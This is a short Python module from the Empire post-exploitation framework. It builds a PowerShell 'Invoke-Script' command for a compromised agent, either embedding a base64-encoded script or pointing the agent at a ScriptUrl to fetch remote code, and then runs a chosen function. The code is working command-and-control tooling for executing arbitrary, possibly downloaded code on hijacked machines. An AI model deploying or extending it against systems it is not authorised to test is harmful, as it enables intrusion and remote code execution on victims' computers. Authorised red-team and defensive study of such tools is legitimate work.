from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        script_end = "\nInvoke-Script"

        if params["File"]:
            encoded_script = params["File"].get_base64_file()
            script_end += f" -EncodedScript '{encoded_script}'"
        elif params["ScriptUrl"]:
            script_end += " -ScriptUrl '" + str(params["ScriptUrl"]) + "'"

        script_end += " -FunctionCommand '" + str(params["FunctionCommand"]) + "'"

        return script, script_end
